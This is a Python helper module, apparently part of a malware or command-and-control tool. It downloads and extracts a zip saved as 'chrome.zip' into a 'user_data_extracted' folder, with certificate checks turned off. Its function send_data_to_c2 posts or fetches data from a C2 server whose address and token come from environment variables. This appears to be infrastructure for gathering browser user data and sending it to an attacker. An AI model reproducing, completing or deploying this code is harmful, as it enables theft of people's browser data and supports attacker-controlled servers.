import os
from fastapi import UploadFile
import zipfile
import io
import requests
import shutil
from dotenv import load_dotenv
import json


def download_file(url, directory="downloads"):
    response = requests.head(url, allow_redirects=True, verify=False)

    if response.headers.get("Content-Type") == 'application/zip':
        response = requests.get(url, stream=True, allow_redirects=True, verify=False)
        if not os.path.exists(directory):
            os.makedirs(directory)
        filepath = os.path.join(directory, "chrome.zip")
        with open(filepath, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)

        return filepath
    else:
        return False


def extract_zip(zip_file_path: str):
    extracted_folder = "user_data_extracted"
    if not os.path.exists(extracted_folder):
        os.makedirs(extracted_folder)
    with zipfile.ZipFile(zip_file_path, "r") as zip_ref:
        zip_ref.extractall(extracted_folder)
    extracted_folder_path = os.path.abspath(extracted_folder)
    return extracted_folder_path


def save_to_tempfile(file_content: bytes):
    temp_file = io.BytesIO()
    temp_file.write(file_content)
    temp_file.seek(0)
    return temp_file


def is_zip_file(file_path):
    file_extension = os.path.splitext(file_path)[1]
    if file_extension.lower() == ".zip":
        return True
    else:
        return False


def remove_directory(directory):
    try:
        shutil.rmtree(directory)
        return True
    except Exception as e:
        return False


def send_data_to_c2(method, endpoint, data):
    load_dotenv()
    c2_url = str(os.getenv("C2_URL"))
    token = str(os.getenv("TOKEN"))
    headers = {"Content-Type": "application/json", "authorization": token}
    if method == "POST":
        response = requests.post(
            f"{c2_url}/{endpoint}", data=data, headers=headers)
    elif method == "GET":
        response = requests.get(
            f"{c2_url}/{endpoint}", params=data, headers=headers)
    return response
